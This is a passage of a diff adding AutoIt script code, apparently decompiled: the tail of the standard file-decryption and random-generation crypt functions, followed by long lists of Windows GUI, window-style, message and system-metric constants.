+            ExitLoop
+        EndIf
+        $houtfile = FileOpen($sdestinationfile, $fo_overwrite + $fo_createpath + $fo_binary)
+        If $houtfile = +0xffffffff Then
+            $ierror = 0x3
+            $iextended = _WinAPI_GetLastError()
+            $breturn = False
+            ExitLoop
+        EndIf
+        Do
+            $dtempdata = FileRead($hinfile, 0x400 * 0x400)
+            $iread += BinaryLen($dtempdata)
+            If $iread = $ifilesize Then
+                $dtempdata = _Crypt_DecryptData($dtempdata, $vcryptkey, $calg_userkey, True)
+                If @error Then
+                    $ierror = @error + 0x190
+                    $iextended = @extended
+                    $breturn = False
+                EndIf
+                FileWrite($houtfile, $dtempdata)
+                ExitLoop 0x2
+            Else
+                $dtempdata = _Crypt_DecryptData($dtempdata, $vcryptkey, $calg_userkey, False)
+                If @error Then
+                    $ierror = @error + 0x1f4
+                    $iextended = @extended
+                    $breturn = False
+                    ExitLoop 0x2
+                EndIf
+                FileWrite($houtfile, $dtempdata)
+            EndIf
+        Until False
+    Until True
+    If $ialgid <> $calg_userkey Then _Crypt_DestroyKey($vcryptkey)
+    _Crypt_Shutdown()
+    If $hinfile <> +0xffffffff Then FileClose($hinfile)
+    If $houtfile <> +0xffffffff Then FileClose($houtfile)
+    Return SetError($ierror, $iextended, $breturn)
+EndFunc   ;==>_CRYPT_DECRYPTFILE
+Func _Crypt_GenRandom($pbuffer, $isize)
+    _Crypt_Startup()
+    If @error Then Return SetError(@error, @extended, False)
+    Local $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptGenRandom", "handle", __CRYPT_CONTEXT(), "dword", $isize, "struct*", $pbuffer)
+    Local $ierror = @error, $iextended = @extended
+    If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+    _Crypt_Shutdown()
+    If $ierror Or (Not $acall[0x0]) Then
+        Return SetError($ierror + 0xa, $iextended, False)
+    Else
+        Return True
+    EndIf
+EndFunc   ;==>_CRYPT_GENRANDOM
+Func __CRYPT_REFCOUNT()
+    Return $__g_acryptinternaldata[0x0]
+EndFunc   ;==>__CRYPT_REFCOUNT
+Func __CRYPT_REFCOUNTINC()
+    $__g_acryptinternaldata[0x0] += 0x1
+EndFunc   ;==>__CRYPT_REFCOUNTINC
+Func __CRYPT_REFCOUNTDEC()
+    If $__g_acryptinternaldata[0x0] > 0x0 Then $__g_acryptinternaldata[0x0] -= 0x1
+EndFunc   ;==>__CRYPT_REFCOUNTDEC
+Func __CRYPT_DLLHANDLE()
+    Return $__g_acryptinternaldata[0x1]
+EndFunc   ;==>__CRYPT_DLLHANDLE
+Func __CRYPT_DLLHANDLESET($hadvapi32)
+    $__g_acryptinternaldata[0x1] = $hadvapi32
+EndFunc   ;==>__CRYPT_DLLHANDLESET
+Func __CRYPT_CONTEXT()
+    Return $__g_acryptinternaldata[0x2]
+EndFunc   ;==>__CRYPT_CONTEXT
+Func __CRYPT_CONTEXTSET($hcryptcontext)
+    $__g_acryptinternaldata[0x2] = $hcryptcontext
+EndFunc   ;==>__CRYPT_CONTEXTSET
+Func __CRYPT_GETCALGFROMCRYPTKEY($vcryptkey)
+    Local $talgid = DllStructCreate("uint")
+    Local $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptGetKeyParam", "handle", $vcryptkey, "dword", $kp_algid, "struct*", $talgid, "dword*", DllStructGetSize($talgid), "dword", 0x0)
+    Local $ierror = @error, $iextended = @extended
+    If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+    If $ierror Or Not $acall[0x0] Then
+        Return SetError($ierror + 0x50, $iextended, $crypt_userdata)
+    Else
+        Return DllStructGetData($talgid, 0x1)
+    EndIf
+EndFunc   ;==>__CRYPT_GETCALGFROMCRYPTKEY
+Global Const $gui_event_single = 0x0
+Global Const $gui_event_array = 0x1
+Global Const $gui_event_none = 0x0
+Global Const $gui_event_close = +0xfffffffd
+Global Const $gui_event_minimize = +0xfffffffc
+Global Const $gui_event_restore = +0xfffffffb
+Global Const $gui_event_maximize = +0xfffffffa
+Global Const $gui_event_primarydown = +0xfffffff9
+Global Const $gui_event_primaryup = +0xfffffff8
+Global Const $gui_event_secondarydown = +0xfffffff7
+Global Const $gui_event_secondaryup = +0xfffffff6
+Global Const $gui_event_mousemove = +0xfffffff5
+Global Const $gui_event_resized = +0xfffffff4
+Global Const $gui_event_dropped = +0xfffffff3
+Global Const $gui_rundefmsg = "GUI_RUNDEFMSG"
+Global Const $gui_avistop = 0x0
+Global Const $gui_avistart = 0x1
+Global Const $gui_aviclose = 0x2
+Global Const $gui_checked = 0x1
+Global Const $gui_indeterminate = 0x2
+Global Const $gui_unchecked = 0x4
+Global Const $gui_dropaccepted = 0x8
+Global Const $gui_nodropaccepted = 0x1000
+Global Const $gui_acceptfiles = $gui_dropaccepted
+Global Const $gui_show = 0x10
+Global Const $gui_hide = 0x20
+Global Const $gui_enable = 0x40
+Global Const $gui_disable = 0x80
+Global Const $gui_focus = 0x100
+Global Const $gui_nofocus = 0x2000
+Global Const $gui_defbutton = 0x200
+Global Const $gui_expand = 0x400
+Global Const $gui_ontop = 0x800
+Global Const $gui_fontnormal = 0x0
+Global Const $gui_fontitalic = 0x2
+Global Const $gui_fontunder = 0x4
+Global Const $gui_fontstrike = 0x8
+Global Const $gui_dockauto = 0x1
+Global Const $gui_dockleft = 0x2
+Global Const $gui_dockright = 0x4
+Global Const $gui_dockhcenter = 0x8
+Global Const $gui_docktop = 0x20
+Global Const $gui_dockbottom = 0x40
+Global Const $gui_dockvcenter = 0x80
+Global Const $gui_dockwidth = 0x100
+Global Const $gui_dockheight = 0x200
+Global Const $gui_docksize = 0x300
+Global Const $gui_dockmenubar = 0x220
+Global Const $gui_dockstatebar = 0x240
+Global Const $gui_dockall = 0x322
+Global Const $gui_dockborders = 0x66
+Global Const $gui_gr_close = 0x1
+Global Const $gui_gr_line = 0x2
+Global Const $gui_gr_bezier = 0x4
+Global Const $gui_gr_move = 0x6
+Global Const $gui_gr_color = 0x8
+Global Const $gui_gr_rect = 0xa
+Global Const $gui_gr_ellipse = 0xc
+Global Const $gui_gr_pie = 0xe
+Global Const $gui_gr_dot = 0x10
+Global Const $gui_gr_pixel = 0x12
+Global Const $gui_gr_hint = 0x14
+Global Const $gui_gr_refresh = 0x16
+Global Const $gui_gr_pensize = 0x18
+Global Const $gui_gr_nobkcolor = +0xfffffffe
+Global Const $gui_bkcolor_default = +0xffffffff
+Global Const $gui_bkcolor_transparent = +0xfffffffe
+Global Const $gui_bkcolor_lv_alternate = 0xfe000000
+Global Const $gui_read_default = 0x0
+Global Const $gui_read_extended = 0x1
+Global Const $gui_cursor_nooverride = 0x0
+Global Const $gui_cursor_override = 0x1
+Global Const $gui_ws_ex_parentdrag = 0x100000
+Global Const $wc_animate = "SysAnimate32"
+Global Const $wc_button = "Button"
+Global Const $wc_combobox = "ComboBox"
+Global Const $wc_comboboxex = "ComboBoxEx32"
+Global Const $wc_datetimepick = "SysDateTimePick32"
+Global Const $wc_edit = "Edit"
+Global Const $wc_header = "SysHeader32"
+Global Const $wc_hotkey = "msctls_hotkey32"
+Global Const $wc_ipaddress = "SysIPAddress32"
+Global Const $wc_link = "SysLink"
+Global Const $wc_listbox = "ListBox"
+Global Const $wc_listview = "SysListView32"
+Global Const $wc_monthcal = "SysMonthCal32"
+Global Const $wc_nativefontctl = "NativeFontCtl"
+Global Const $wc_pagescroller = "SysPager"
+Global Const $wc_progress = "msctls_progress32"
+Global Const $wc_rebar = "ReBarWindow32"
+Global Const $wc_scrollbar = "ScrollBar"
+Global Const $wc_static = "Static"
+Global Const $wc_statusbar = "msctls_statusbar32"
+Global Const $wc_tabcontrol = "SysTabControl32"
+Global Const $wc_toolbar = "ToolbarWindow32"
+Global Const $wc_tooltips = "tooltips_class32"
+Global Const $wc_trackbar = "msctls_trackbar32"
+Global Const $wc_treeview = "SysTreeView32"
+Global Const $wc_updown = "msctls_updown32"
+Global Const $ws_overlapped = 0x0
+Global Const $ws_tiled = $ws_overlapped
+Global Const $ws_maximizebox = 0x10000
+Global Const $ws_minimizebox = 0x20000
+Global Const $ws_tabstop = 0x10000
+Global Const $ws_group = 0x20000
+Global Const $ws_sizebox = 0x40000
+Global Const $ws_thickframe = $ws_sizebox
+Global Const $ws_sysmenu = 0x80000
+Global Const $ws_hscroll = 0x100000
+Global Const $ws_vscroll = 0x200000
+Global Const $ws_dlgframe = 0x400000
+Global Const $ws_border = 0x800000
+Global Const $ws_caption = 0xc00000
+Global Const $ws_overlappedwindow = BitOR($ws_caption, $ws_maximizebox, $ws_minimizebox, $ws_overlapped, $ws_sysmenu, $ws_thickframe)
+Global Const $ws_tiledwindow = $ws_overlappedwindow
+Global Const $ws_maximize = 0x1000000
+Global Const $ws_clipchildren = 0x2000000
+Global Const $ws_clipsiblings = 0x4000000
+Global Const $ws_disabled = 0x8000000
+Global Const $ws_visible = 0x10000000
+Global Const $ws_minimize = 0x20000000
+Global Const $ws_iconic = $ws_minimize
+Global Const $ws_child = 0x40000000
+Global Const $ws_childwindow = $ws_child
+Global Const $ws_popup = 0x80000000
+Global Const $ws_popupwindow = 0x80880000
+Global Const $ds_3dlook = 0x4
+Global Const $ds_absalign = 0x1
+Global Const $ds_center = 0x800
+Global Const $ds_centermouse = 0x1000
+Global Const $ds_contexthelp = 0x2000
+Global Const $ds_control = 0x400
+Global Const $ds_fixedsys = 0x8
+Global Const $ds_localedit = 0x20
+Global Const $ds_modalframe = 0x80
+Global Const $ds_nofailcreate = 0x10
+Global Const $ds_noidlemsg = 0x100
+Global Const $ds_setfont = 0x40
+Global Const $ds_setforeground = 0x200
+Global Const $ds_shellfont = BitOR($ds_fixedsys, $ds_setfont)
+Global Const $ds_sysmodal = 0x2
+Global Const $ws_ex_acceptfiles = 0x10
+Global Const $ws_ex_appwindow = 0x40000
+Global Const $ws_ex_composited = 0x2000000
+Global Const $ws_ex_controlparent = 0x10000
+Global Const $ws_ex_clientedge = 0x200
+Global Const $ws_ex_contexthelp = 0x400
+Global Const $ws_ex_dlgmodalframe = 0x1
+Global Const $ws_ex_layered = 0x80000
+Global Const $ws_ex_layoutrtl = 0x400000
+Global Const $ws_ex_left = 0x0
+Global Const $ws_ex_leftscrollbar = 0x4000
+Global Const $ws_ex_ltrreading = 0x0
+Global Const $ws_ex_mdichild = 0x40
+Global Const $ws_ex_noactivate = 0x8000000
+Global Const $ws_ex_noinheritlayout = 0x100000
+Global Const $ws_ex_noparentnotify = 0x4
+Global Const $ws_ex_noredirectionbitmap = 0x200000
+Global Const $ws_ex_right = 0x1000
+Global Const $ws_ex_rightscrollbar = 0x0
+Global Const $ws_ex_rtlreading = 0x2000
+Global Const $ws_ex_staticedge = 0x20000
+Global Const $ws_ex_toolwindow = 0x80
+Global Const $ws_ex_topmost = 0x8
+Global Const $ws_ex_transparent = 0x20
+Global Const $ws_ex_windowedge = 0x100
+Global Const $ws_ex_overlappedwindow = BitOR($ws_ex_clientedge, $ws_ex_windowedge)
+Global Const $ws_ex_palettewindow = BitOR($ws_ex_toolwindow, $ws_ex_topmost, $ws_ex_windowedge)
+Global Const $wm_null = 0x0
+Global Const $wm_create = 0x1
+Global Const $wm_destroy = 0x2
+Global Const $wm_move = 0x3
+Global Const $wm_sizewait = 0x4
+Global Const $wm_size = 0x5
+Global Const $wm_activate = 0x6
+Global Const $wm_setfocus = 0x7
+Global Const $wm_killfocus = 0x8
+Global Const $wm_setvisible = 0x9
+Global Const $wm_enable = 0xa
+Global Const $wm_setredraw = 0xb
+Global Const $wm_settext = 0xc
+Global Const $wm_gettext = 0xd
+Global Const $wm_gettextlength = 0xe
+Global Const $wm_paint = 0xf
+Global Const $wm_close = 0x10
+Global Const $wm_queryendsession = 0x11
+Global Const $wm_quit = 0x12
+Global Const $wm_erasebkgnd = 0x14
+Global Const $wm_queryopen = 0x13
+Global Const $wm_syscolorchange = 0x15
+Global Const $wm_endsession = 0x16
+Global Const $wm_systemerror = 0x17
+Global Const $wm_showwindow = 0x18
+Global Const $wm_ctlcolor = 0x19
+Global Const $wm_settingchange = 0x1a
+Global Const $wm_wininichange = 0x1a
+Global Const $wm_devmodechange = 0x1b
+Global Const $wm_activateapp = 0x1c
+Global Const $wm_fontchange = 0x1d
+Global Const $wm_timechange = 0x1e
+Global Const $wm_cancelmode = 0x1f
+Global Const $wm_setcursor = 0x20
+Global Const $wm_mouseactivate = 0x21
+Global Const $wm_childactivate = 0x22
+Global Const $wm_queuesync = 0x23
+Global Const $wm_getminmaxinfo = 0x24
+Global Const $wm_logoff = 0x25
+Global Const $wm_painticon = 0x26
+Global Const $wm_iconerasebkgnd = 0x27
+Global Const $wm_nextdlgctl = 0x28
+Global Const $wm_alttabactive = 0x29
+Global Const $wm_spoolerstatus = 0x2a
+Global Const $wm_drawitem = 0x2b
+Global Const $wm_measureitem = 0x2c
+Global Const $wm_deleteitem = 0x2d
+Global Const $wm_vkeytoitem = 0x2e
+Global Const $wm_chartoitem = 0x2f
+Global Const $wm_setfont = 0x30
+Global Const $wm_getfont = 0x31
+Global Const $wm_sethotkey = 0x32
+Global Const $wm_gethotkey = 0x33
+Global Const $wm_filesyschange = 0x34
+Global Const $wm_isactiveicon = 0x35
+Global Const $wm_queryparkicon = 0x36
+Global Const $wm_querydragicon = 0x37
+Global Const $wm_winhelp = 0x38
+Global Const $wm_compareitem = 0x39
+Global Const $wm_fullscreen = 0x3a
+Global Const $wm_clientshutdown = 0x3b
+Global Const $wm_ddemlevent = 0x3c
+Global Const $wm_getobject = 0x3d
+Global Const $wm_calcscroll = 0x3f
+Global Const $wm_testing = 0x40
+Global Const $wm_compacting = 0x41
+Global Const $wm_otherwindowcreated = 0x42
+Global Const $wm_otherwindowdestroyed = 0x43
+Global Const $wm_commnotify = 0x44
+Global Const $wm_mediastatuschange = 0x45
+Global Const $wm_windowposchanging = 0x46
+Global Const $wm_windowposchanged = 0x47
+Global Const $wm_power = 0x48
+Global Const $wm_copyglobaldata = 0x49
+Global Const $wm_copydata = 0x4a
+Global Const $wm_canceljournal = 0x4b
+Global Const $wm_logonnotify = 0x4c
+Global Const $wm_keyf1 = 0x4d
+Global Const $wm_notify = 0x4e
+Global Const $wm_access_window = 0x4f
+Global Const $wm_inputlangchangerequest = 0x50
+Global Const $wm_inputlangchange = 0x51
+Global Const $wm_tcard = 0x52
+Global Const $wm_help = 0x53
+Global Const $wm_userchanged = 0x54
+Global Const $wm_notifyformat = 0x55
+Global Const $wm_qm_activate = 0x60
+Global Const $wm_hook_do_callback = 0x61
+Global Const $wm_syscopydata = 0x62
+Global Const $wm_finaldestroy = 0x70
+Global Const $wm_measureitem_clientdata = 0x71
+Global Const $wm_contextmenu = 0x7b
+Global Const $wm_stylechanging = 0x7c
+Global Const $wm_stylechanged = 0x7d
+Global Const $wm_displaychange = 0x7e
+Global Const $wm_geticon = 0x7f
+Global Const $wm_seticon = 0x80
+Global Const $wm_nccreate = 0x81
+Global Const $wm_ncdestroy = 0x82
+Global Const $wm_nccalcsize = 0x83
+Global Const $wm_nchittest = 0x84
+Global Const $wm_ncpaint = 0x85
+Global Const $wm_ncactivate = 0x86
+Global Const $wm_getdlgcode = 0x87
+Global Const $wm_syncpaint = 0x88
+Global Const $wm_synctask = 0x89
+Global Const $wm_kludgeminrect = 0x8b
+Global Const $wm_lpkdrawswitchwnd = 0x8c
+Global Const $wm_uahdestroywindow = 0x90
+Global Const $wm_uahdrawmenu = 0x91
+Global Const $wm_uahdrawmenuitem = 0x92
+Global Const $wm_uahinitmenu = 0x93
+Global Const $wm_uahmeasuremenuitem = 0x94
+Global Const $wm_uahncpaintmenupopup = 0x95
+Global Const $wm_ncmousemove = 0xa0
+Global Const $wm_nclbuttondown = 0xa1
+Global Const $wm_nclbuttonup = 0xa2
+Global Const $wm_nclbuttondblclk = 0xa3
+Global Const $wm_ncrbuttondown = 0xa4
+Global Const $wm_ncrbuttonup = 0xa5
+Global Const $wm_ncrbuttondblclk = 0xa6
+Global Const $wm_ncmbuttondown = 0xa7
+Global Const $wm_ncmbuttonup = 0xa8
+Global Const $wm_ncmbuttondblclk = 0xa9
+Global Const $wm_ncxbuttondown = 0xab
+Global Const $wm_ncxbuttonup = 0xac
+Global Const $wm_ncxbuttondblclk = 0xad
+Global Const $wm_ncuahdrawcaption = 0xae
+Global Const $wm_ncuahdrawframe = 0xaf
+Global Const $wm_input_device_change = 0xfe
+Global Const $wm_input = 0xff
+Global Const $wm_keydown = 0x100
+Global Const $wm_keyfirst = 0x100
+Global Const $wm_keyup = 0x101
+Global Const $wm_char = 0x102
+Global Const $wm_deadchar = 0x103
+Global Const $wm_syskeydown = 0x104
+Global Const $wm_syskeyup = 0x105
+Global Const $wm_syschar = 0x106
+Global Const $wm_sysdeadchar = 0x107
+Global Const $wm_yomichar = 0x108
+Global Const $wm_keylast = 0x109
+Global Const $wm_unichar = 0x109
+Global Const $wm_convertrequest = 0x10a
+Global Const $wm_convertresult = 0x10b
+Global Const $wm_im_info = 0x10c
+Global Const $wm_ime_startcomposition = 0x10d
+Global Const $wm_ime_endcomposition = 0x10e
+Global Const $wm_ime_composition = 0x10f
+Global Const $wm_ime_keylast = 0x10f
+Global Const $wm_initdialog = 0x110
+Global Const $wm_command = 0x111
+Global Const $wm_syscommand = 0x112
+Global Const $wm_timer = 0x113
+Global Const $wm_hscroll = 0x114
+Global Const $wm_vscroll = 0x115
+Global Const $wm_initmenu = 0x116
+Global Const $wm_initmenupopup = 0x117
+Global Const $wm_systimer = 0x118
+Global Const $wm_gesture = 0x119
+Global Const $wm_gesturenotify = 0x11a
+Global Const $wm_gestureinput = 0x11b
+Global Const $wm_gesturenotified = 0x11c
+Global Const $wm_menuselect = 0x11f
+Global Const $wm_menuchar = 0x120
+Global Const $wm_enteridle = 0x121
+Global Const $wm_menurbuttonup = 0x122
+Global Const $wm_menudrag = 0x123
+Global Const $wm_menugetobject = 0x124
+Global Const $wm_uninitmenupopup = 0x125
+Global Const $wm_menucommand = 0x126
+Global Const $wm_changeuistate = 0x127
+Global Const $wm_updateuistate = 0x128
+Global Const $wm_queryuistate = 0x129
+Global Const $wm_lbtrackpoint = 0x131
+Global Const $wm_ctlcolormsgbox = 0x132
+Global Const $wm_ctlcoloredit = 0x133
+Global Const $wm_ctlcolorlistbox = 0x134
+Global Const $wm_ctlcolorbtn = 0x135
+Global Const $wm_ctlcolordlg = 0x136
+Global Const $wm_ctlcolorscrollbar = 0x137
+Global Const $wm_ctlcolorstatic = 0x138
+Global Const $mn_gethmenu = 0x1e1
+Global Const $wm_parentnotify = 0x210
+Global Const $wm_entermenuloop = 0x211
+Global Const $wm_exitmenuloop = 0x212
+Global Const $wm_nextmenu = 0x213
+Global Const $wm_sizing = 0x214
+Global Const $wm_capturechanged = 0x215
+Global Const $wm_moving = 0x216
+Global Const $wm_powerbroadcast = 0x218
+Global Const $wm_devicechange = 0x219
+Global Const $wm_mdicreate = 0x220
+Global Const $wm_mdidestroy = 0x221
+Global Const $wm_mdiactivate = 0x222
+Global Const $wm_mdirestore = 0x223
+Global Const $wm_mdinext = 0x224
+Global Const $wm_mdimaximize = 0x225
+Global Const $wm_mditile = 0x226
+Global Const $wm_mdicascade = 0x227
+Global Const $wm_mdiiconarrange = 0x228
+Global Const $wm_mdigetactive = 0x229
+Global Const $wm_dropobject = 0x22a
+Global Const $wm_querydropobject = 0x22b
+Global Const $wm_begindrag = 0x22c
+Global Const $wm_dragloop = 0x22d
+Global Const $wm_dragselect = 0x22e
+Global Const $wm_dragmove = 0x22f
+Global Const $wm_mdisetmenu = 0x230
+Global Const $wm_entersizemove = 0x231
+Global Const $wm_exitsizemove = 0x232
+Global Const $wm_dropfiles = 0x233
+Global Const $wm_mdirefreshmenu = 0x234
+Global Const $wm_touch = 0x240
+Global Const $wm_ime_setcontext = 0x281
+Global Const $wm_ime_notify = 0x282
+Global Const $wm_ime_control = 0x283
+Global Const $wm_ime_compositionfull = 0x284
+Global Const $wm_ime_select = 0x285
+Global Const $wm_ime_char = 0x286
+Global Const $wm_ime_system = 0x287
+Global Const $wm_ime_request = 0x288
+Global Const $wm_ime_keydown = 0x290
+Global Const $wm_ime_keyup = 0x291
+Global Const $wm_ncmousehover = 0x2a0
+Global Const $wm_mousehover = 0x2a1
+Global Const $wm_ncmouseleave = 0x2a2
+Global Const $wm_mouseleave = 0x2a3
+Global Const $wm_wtssession_change = 0x2b1
+Global Const $wm_tablet_first = 0x2c0
+Global Const $wm_tablet_last = 0x2df
+Global Const $wm_cut = 0x300
+Global Const $wm_copy = 0x301
+Global Const $wm_paste = 0x302
+Global Const $wm_clear = 0x303
+Global Const $wm_undo = 0x304
+Global Const $wm_paletteischanging = 0x310
+Global Const $wm_hotkey = 0x312
+Global Const $wm_palettechanged = 0x311
+Global Const $wm_sysmenu = 0x313
+Global Const $wm_hookmsg = 0x314
+Global Const $wm_exitprocess = 0x315
+Global Const $wm_wakethread = 0x316
+Global Const $wm_print = 0x317
+Global Const $wm_printclient = 0x318
+Global Const $wm_appcommand = 0x319
+Global Const $wm_querynewpalette = 0x30f
+Global Const $wm_themechanged = 0x31a
+Global Const $wm_uahinit = 0x31b
+Global Const $wm_desktopnotify = 0x31c
+Global Const $wm_clipboardupdate = 0x31d
+Global Const $wm_dwmcompositionchanged = 0x31e
+Global Const $wm_dwmncrenderingchanged = 0x31f
+Global Const $wm_dwmcolorizationcolorchanged = 0x320
+Global Const $wm_dwmwindowmaximizedchange = 0x321
+Global Const $wm_dwmexileframe = 0x322
+Global Const $wm_dwmsendiconicthumbnail = 0x323
+Global Const $wm_magnification_started = 0x324
+Global Const $wm_magnification_ended = 0x325
+Global Const $wm_dwmsendiconiclivepreviewbitmap = 0x326
+Global Const $wm_dwmthumbnailsizechanged = 0x327
+Global Const $wm_magnification_output = 0x328
+Global Const $wm_measurecontrol = 0x330
+Global Const $wm_getactiontext = 0x331
+Global Const $wm_forwardkeydown = 0x333
+Global Const $wm_forwardkeyup = 0x334
+Global Const $wm_gettitlebarinfoex = 0x33f
+Global Const $wm_notifywow = 0x340
+Global Const $wm_handheldfirst = 0x358
+Global Const $wm_handheldlast = 0x35f
+Global Const $wm_afxfirst = 0x360
+Global Const $wm_afxlast = 0x37f
+Global Const $wm_penwinfirst = 0x380
+Global Const $wm_penwinlast = 0x38f
+Global Const $wm_dde_initiate = 0x3e0
+Global Const $wm_dde_terminate = 0x3e1
+Global Const $wm_dde_advise = 0x3e2
+Global Const $wm_dde_unadvise = 0x3e3
+Global Const $wm_dde_ack = 0x3e4
+Global Const $wm_dde_data = 0x3e5
+Global Const $wm_dde_request = 0x3e6
+Global Const $wm_dde_poke = 0x3e7
+Global Const $wm_dde_execute = 0x3e8
+Global Const $wm_dbnotification = 0x3fd
+Global Const $wm_netconnect = 0x3fe
+Global Const $wm_hibernate = 0x3ff
+Global Const $wm_user = 0x400
+Global Const $wm_app = 0x8000
+Global Const $nm_first = 0x0
+Global Const $nm_outofmemory = $nm_first + 0xffffffff
+Global Const $nm_click = $nm_first + 0xfffffffe
+Global Const $nm_dblclk = $nm_first + 0xfffffffd
+Global Const $nm_return = $nm_first + 0xfffffffc
+Global Const $nm_rclick = $nm_first + 0xfffffffb
+Global Const $nm_rdblclk = $nm_first + 0xfffffffa
+Global Const $nm_setfocus = $nm_first + 0xfffffff9
+Global Const $nm_killfocus = $nm_first + 0xfffffff8
+Global Const $nm_customdraw = $nm_first + 0xfffffff4
+Global Const $nm_hover = $nm_first + 0xfffffff3
+Global Const $nm_nchittest = $nm_first + 0xfffffff2
+Global Const $nm_keydown = $nm_first + 0xfffffff1
+Global Const $nm_releasedcapture = $nm_first + 0xfffffff0
+Global Const $nm_setcursor = $nm_first + 0xffffffef
+Global Const $nm_char = $nm_first + 0xffffffee
+Global Const $nm_tooltipscreated = $nm_first + 0xffffffed
+Global Const $nm_ldown = $nm_first + 0xffffffec
+Global Const $nm_rdown = $nm_first + 0xffffffeb
+Global Const $nm_themechanged = $nm_first + 0xffffffea
+Global Const $wm_mousefirst = 0x200
+Global Const $wm_mousemove = 0x200
+Global Const $wm_lbuttondown = 0x201
+Global Const $wm_lbuttonup = 0x202
+Global Const $wm_lbuttondblclk = 0x203
+Global Const $wm_rbuttondown = 0x204
+Global Const $wm_rbuttonup = 0x205
+Global Const $wm_rbuttondblclk = 0x206
+Global Const $wm_mbuttondown = 0x207
+Global Const $wm_mbuttonup = 0x208
+Global Const $wm_mbuttondblclk = 0x209
+Global Const $wm_mousewheel = 0x20a
+Global Const $wm_xbuttondown = 0x20b
+Global Const $wm_xbuttonup = 0x20c
+Global Const $wm_xbuttondblclk = 0x20d
+Global Const $wm_mousehwheel = 0x20e
+Global Const $ps_solid = 0x0
+Global Const $ps_dash = 0x1
+Global Const $ps_dot = 0x2
+Global Const $ps_dashdot = 0x3
+Global Const $ps_dashdotdot = 0x4
+Global Const $ps_null = 0x5
+Global Const $ps_insideframe = 0x6
+Global Const $ps_userstyle = 0x7
+Global Const $ps_alternate = 0x8
+Global Const $ps_endcap_round = 0x0
+Global Const $ps_endcap_square = 0x100
+Global Const $ps_endcap_flat = 0x200
+Global Const $ps_join_bevel = 0x1000
+Global Const $ps_join_miter = 0x2000
+Global Const $ps_join_round = 0x0
+Global Const $ps_geometric = 0x10000
+Global Const $ps_cosmetic = 0x0
+Global Const $lwa_alpha = 0x2
+Global Const $lwa_colorkey = 0x1
+Global Const $rgn_and = 0x1
+Global Const $rgn_or = 0x2
+Global Const $rgn_xor = 0x3
+Global Const $rgn_diff = 0x4
+Global Const $rgn_copy = 0x5
+Global Const $errorregion = 0x0
+Global Const $nullregion = 0x1
+Global Const $simpleregion = 0x2
+Global Const $complexregion = 0x3
+Global Const $transparent = 0x1
+Global Const $opaque = 0x2
+Global Const $ccm_first = 0x2000
+Global Const $ccm_getunicodeformat = ($ccm_first + 0x6)
+Global Const $ccm_setunicodeformat = ($ccm_first + 0x5)
+Global Const $ccm_setbkcolor = $ccm_first + 0x1
+Global Const $ccm_setcolorscheme = $ccm_first + 0x2
+Global Const $ccm_getcolorscheme = $ccm_first + 0x3
+Global Const $ccm_getdroptarget = $ccm_first + 0x4
+Global Const $ccm_setwindowtheme = $ccm_first + 0xb
+Global Const $ga_parent = 0x1
+Global Const $ga_root = 0x2
+Global Const $ga_rootowner = 0x3
+Global Const $sm_cxscreen = 0x0
+Global Const $sm_cyscreen = 0x1
+Global Const $sm_cxvscroll = 0x2
+Global Const $sm_cyhscroll = 0x3
+Global Const $sm_cycaption = 0x4
+Global Const $sm_cxborder = 0x5
+Global Const $sm_cyborder = 0x6
+Global Const $sm_cxfixedframe = 0x7
+Global Const $sm_cxdlgframe = $sm_cxfixedframe
+Global Const $sm_cyfixedframe = 0x8
+Global Const $sm_cydlgframe = $sm_cyfixedframe
+Global Const $sm_cyvthumb = 0x9
+Global Const $sm_cxhthumb = 0xa
+Global Const $sm_cxicon = 0xb
+Global Const $sm_cyicon = 0xc
+Global Const $sm_cxcursor = 0xd
+Global Const $sm_cycursor = 0xe
+Global Const $sm_cymenu = 0xf
+Global Const $sm_cxfullscreen = 0x10
+Global Const $sm_cyfullscreen = 0x11
+Global Const $sm_cykanjiwindow = 0x12
+Global Const $sm_mousepresent = 0x13
+Global Const $sm_cyvscroll = 0x14
+Global Const $sm_cxhscroll = 0x15
+Global Const $sm_debug = 0x16
+Global Const $sm_swapbutton = 0x17
+Global Const $sm_reserved1 = 0x18
+Global Const $sm_reserved2 = 0x19
+Global Const $sm_reserved3 = 0x1a
+Global Const $sm_reserved4 = 0x1b
+Global Const $sm_cxmin = 0x1c
+Global Const $sm_cymin = 0x1d
+Global Const $sm_cxsize = 0x1e
+Global Const $sm_cysize = 0x1f
+Global Const $sm_cxsizeframe = 0x20
+Global Const $sm_cxframe = $sm_cxsizeframe
+Global Const $sm_cysizeframe = 0x21
+Global Const $sm_cyframe = $sm_cysizeframe
+Global Const $sm_cxmintrack = 0x22
+Global Const $sm_cymintrack = 0x23
+Global Const $sm_cxdoubleclk = 0x24
+Global Const $sm_cydoubleclk = 0x25
+Global Const $sm_cxiconspacing = 0x26
+Global Const $sm_cyiconspacing = 0x27
+Global Const $sm_menudropalignment = 0x28
+Global Const $sm_penwindows = 0x29
+Global Const $sm_dbcsenabled = 0x2a
+Global Const $sm_cmousebuttons = 0x2b
+Global Const $sm_secure = 0x2c
+Global Const $sm_cxedge = 0x2d
+Global Const $sm_cyedge = 0x2e
+Global Const $sm_cxminspacing = 0x2f
+Global Const $sm_cyminspacing = 0x30
+Global Const $sm_cxsmicon = 0x31
+Global Const $sm_cysmicon = 0x32
+Global Const $sm_cysmcaption = 0x33
+Global Const $sm_cxsmsize = 0x34
+Global Const $sm_cysmsize = 0x35
+Global Const $sm_cxmenusize = 0x36
+Global Const $sm_cymenusize = 0x37
+Global Const $sm_arrange = 0x38
+Global Const $sm_cxminimized = 0x39
+Global Const $sm_cyminimized = 0x3a
+Global Const $sm_cxmaxtrack = 0x3b
+Global Const $sm_cymaxtrack = 0x3c
+Global Const $sm_cxmaximized = 0x3d
+Global Const $sm_cymaximized = 0x3e
+Global Const $sm_network = 0x3f
+Global Const $sm_cleanboot = 0x43
+Global Const $sm_cxdrag = 0x44
+Global Const $sm_cydrag = 0x45
+Global Const $sm_showsounds = 0x46
+Global Const $sm_cxmenucheck = 0x47
+Global Const $sm_cymenucheck = 0x48
+Global Const $sm_slowmachine = 0x49
+Global Const $sm_mideastenabled = 0x4a
+Global Const $sm_mousewheelpresent = 0x4b
+Global Const $sm_xvirtualscreen = 0x4c
+Global Const $sm_yvirtualscreen = 0x4d
+Global Const $sm_cxvirtualscreen = 0x4e
+Global Const $sm_cyvirtualscreen = 0x4f
+Global Const $sm_cmonitors = 0x50
